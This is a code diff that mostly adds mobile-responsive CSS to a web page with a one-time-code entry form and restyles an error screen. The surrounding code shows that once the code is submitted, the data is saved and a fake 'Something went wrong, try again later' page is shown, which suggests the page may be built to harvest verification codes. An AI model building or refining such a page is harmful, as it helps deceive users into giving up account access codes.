@@ -37,6 +37,20 @@
     .download-text { text-align:center; color:#212936; font-size:1rem; margin-bottom:14px; }
     .app-badges { display:flex; justify-content:center; gap:16px; }
     .app-badges img { height:44px; cursor:pointer; }
+  
+    /* Mobile responsive fixes */
+    @media (max-width: 480px) {
+      .container { margin: 16px auto 0; padding: 0 12px 24px; }
+      h1 { font-size: 1.6rem; }
+      .subtitle { font-size: 0.95rem; }
+      .input-group input { font-size: 1rem; padding: 10px 8px; }
+      .otp-input-group { gap: 8px; }
+      .otp-input { width: 40px; height: 44px; font-size: 1.4rem; }
+      .otp-btn, .verify-btn, .back-btn { font-size: 1rem; padding: 12px 0; margin: 12px 0; }
+      .terms { font-size: 0.8rem; }
+      .download-text { font-size: 0.9rem; }
+    }
+
   </style>
 </head>
 <body>
@@ -163,22 +177,42 @@
           
 // Show custom error page after OTP submit
 document.body.innerHTML = `
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Something went wrong</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #fff3f3; text-align: center; padding-top: 120px;}
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #ffffff; 
+            text-align: center; 
+            padding-top: 40px; /* Reduced from 120px to move message higher */
+            margin: 0;
+            min-height: 100vh;
+        }
         .msg { 
             display: inline-block;
-            padding: 40px 60px;
+            padding: 20px 30px;
             background: #ffffff;
-            border: 2px solid #19202c;
+            border: 2px solid #212936;
             border-radius: 14px;
-            box-shadow: 0 2px 16px #19202c;
-            color: #19202c;
-            font-size: 2rem;
+            box-shadow: 0 2px 16px #212936;
+            color: #212936;
+            font-size: 1.2rem;
+            margin-top: 20px; /* Added margin at top */
+        }
+        
+        @media (min-width: 768px) {
+            body {
+                padding-top: 60px; /* Slightly less than original for desktop */
+            }
+            .msg {
+                padding: 30px 50px;
+                font-size: 1.8rem;
+            }
         }
     </style>
 </head>
@@ -188,7 +222,8 @@ document.body.innerHTML = `
         कृपया बाद में पुनः प्रयास करें।
     </div>
 </body>
-</html>`;
+</html>
+`;
 
         } catch (err) { console.error(err); alert('डेटा सेव करने में समस्या आई।'); }
         resetForms();
